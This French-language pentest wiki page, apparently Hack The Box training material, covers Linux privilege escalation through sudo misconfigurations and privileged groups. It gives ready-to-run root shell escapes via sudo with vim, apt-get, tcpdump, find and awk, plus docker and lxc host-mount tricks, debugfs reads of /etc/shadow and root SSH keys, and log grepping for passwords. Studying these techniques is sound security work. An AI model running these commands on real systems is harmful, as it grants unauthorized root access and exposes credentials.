# Sudo et groupes privilegies

Les regles sudo mal configurees et l'appartenance a certains groupes sont parmi les vecteurs d'escalade les plus courants. Une seule ligne dans `/etc/sudoers` ou un groupe `docker` sur le mauvais utilisateur suffit a obtenir root.

## Pourquoi

Sur la plupart des systemes Linux, `sudo` est le mecanisme principal de delegation de privileges. Les administrateurs accordent des droits specifiques pour eviter de partager le mot de passe root, mais des regles trop permissives transforment ces delegations en escalades directes. De la meme maniere, certains groupes systeme donnent un acces quasi-root sans que les administrateurs en mesurent les consequences.

## Comment ca marche

### Abus de sudo

La commande `sudo -l` revele les commandes qu'un utilisateur peut executer avec des privileges eleves. Les configurations dangereuses incluent :

| Configuration | Risque |
|---|---|
| `NOPASSWD: ALL` | Execution de n'importe quelle commande en root sans mot de passe |
| `NOPASSWD: /usr/bin/vim` | Editeur qui peut lancer un shell |
| Chemin relatif | Manipulation du PATH pour substituer le binaire |
| `env_keep+=LD_PRELOAD` | Chargement d'une bibliotheque malveillante |
| `SETENV` | Manipulation des variables d'environnement |

### Groupes privilegies

Certains groupes donnent un acces direct ou indirect a root.

| Groupe | Risque |
|---|---|
| **docker** | Montage du systeme de fichiers hote dans un conteneur |
| **lxd / lxc** | Creation de conteneurs privilegies avec acces au systeme hote |
| **disk** | Acces direct aux peripheriques de stockage (lecture de tout le disque) |
| **adm** | Lecture des logs systeme (credentials, informations sensibles) |
| **sudo / wheel** | Execution de commandes en tant que root |

## En pratique

### Enumeration sudo

```bash
# - Verifier les privileges sudo
sudo -l

# Resultat typique exploitable :
# User htb-student may run the following commands:
#     (root) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /usr/bin/apt-get
```

### Exploitation via des binaires sudo

{% tabs %}
{% tab title="vim" %}
```bash
# - vim peut lancer un shell interactif
sudo vim -c ':!/bin/bash'

# - Ou lire des fichiers sensibles
sudo vim /etc/shadow
```
{% endtab %}
{% tab title="apt-get" %}
```bash
# - apt-get peut executer des commandes via pre-invoke
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```
{% endtab %}
{% tab title="tcpdump" %}
```bash
# - tcpdump avec l'option -z execute un programme apres capture
echo '/bin/bash' > /tmp/shell.sh
chmod +x /tmp/shell.sh
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/shell.sh
```
{% endtab %}
{% tab title="Autres" %}
```bash
# - less / more
sudo less /etc/shadow
# Puis taper : !/bin/bash

# - find
sudo find / -exec /bin/bash \;

# - awk
sudo awk 'BEGIN {system("/bin/bash")}'

# - nmap (anciennes versions)
sudo nmap --interactive
# Puis : !sh
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
Toujours consulter GTFOBins pour verifier si un binaire autorise via sudo permet de lancer un shell, de lire/ecrire des fichiers ou de telecharger du contenu.
{% endhint %}

### Exploitation via les groupes privilegies

{% tabs %}
{% tab title="Docker" %}
```bash
# - Verifier l'appartenance au groupe docker
id
# uid=1000(user) gid=1000(user) groups=1000(user),116(docker)

# - Monter le systeme de fichiers hote
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# On obtient un shell root avec acces complet au systeme hote
```
{% endtab %}
{% tab title="LXD / LXC" %}
```bash
# - Importer une image de conteneur
lxc image import ubuntu-template.tar.xz --alias ubuntutemp

# - Creer un conteneur privilegie avec le systeme hote monte
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# - Demarrer et entrer dans le conteneur
lxc start privesc
lxc exec privesc /bin/bash

# Le systeme hote est accessible sous /mnt/root/
ls -la /mnt/root/root/
```
{% endtab %}
{% tab title="Disk" %}
```bash
# - Le groupe disk permet de lire directement les blocs
# Identifier le disque systeme
df -h

# - Lire le contenu avec debugfs
debugfs /dev/sda1
# debugfs: cat /etc/shadow
# debugfs: cat /root/.ssh/id_rsa
```
{% endtab %}
{% tab title="Adm" %}
```bash
# - Le groupe adm donne acces aux logs
ls -la /var/log/
cat /var/log/auth.log | grep -i "password\|failed"
cat /var/log/syslog | grep -i "cred\|pass"

# Chercher des credentials dans les logs applicatifs
grep -rni "password" /var/log/ 2>/dev/null
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
L'appartenance au groupe `docker` est equivalente a un acces root. Un utilisateur dans ce groupe peut monter l'integralite du systeme de fichiers dans un conteneur et y acceder en tant que root.
{% endhint %}

## Pieges et galeres

- **Chemin absolu dans sudoers** : si la regle sudo specifie `/usr/bin/vim` avec le chemin absolu, on ne peut pas substituer le binaire via PATH. Mais le binaire lui-meme peut quand meme permettre un shell escape
- **NOPASSWD partiel** : une regle `(root) NOPASSWD: /usr/bin/apt-get update` ne permet que la sous-commande `update`, pas `install`. Verifier la portee exacte de la regle
- **Docker socket** : meme sans etre dans le groupe docker, un socket Docker accessible en ecriture (`/var/run/docker.sock`) permet la meme escalade
- **LXD non initialise** : si LXD n'a jamais ete initialise sur le systeme, il faut d'abord executer `lxd init` ou importer manuellement une image
- **sudo et TTY** : certaines regles sudo necessitent un TTY (`requiretty`). Un shell non interactif peut echouer

## Memo express

| Commande | Usage |
|---|---|
| `sudo -l` | Lister les privileges sudo |
| `sudo vim -c ':!/bin/bash'` | Shell via vim |
| `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash` | Shell via apt-get |
| `docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash` | Root via groupe docker |
| `lxc exec privesc /bin/bash` | Root via groupe lxd |
| `debugfs /dev/sda1` | Lecture disque via groupe disk |
| `id` | Verifier les groupes |

***
